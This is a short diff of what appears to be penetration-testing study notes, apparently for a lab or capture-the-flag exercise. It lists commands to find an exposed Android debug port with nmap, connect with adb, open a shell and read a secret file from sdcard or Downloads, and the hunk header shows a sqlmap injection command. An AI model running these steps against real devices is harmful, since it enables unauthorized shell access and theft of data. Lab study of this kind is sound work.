@@ -95,7 +95,7 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
 1. nmap ip -sV -p 5555    (Scan for adb port)
 2. adb connect IP:5555    (Connect adb with parrot)
 3. adb shell              (Access mobile device on parrot)
-4. pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
+4. pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If nothing is there then go to Downloads folder using: cd downloads, may need to search others also)
 -------------------------------------------
 1. nmap -p 5555 ip
 2. adb connect ip:5555
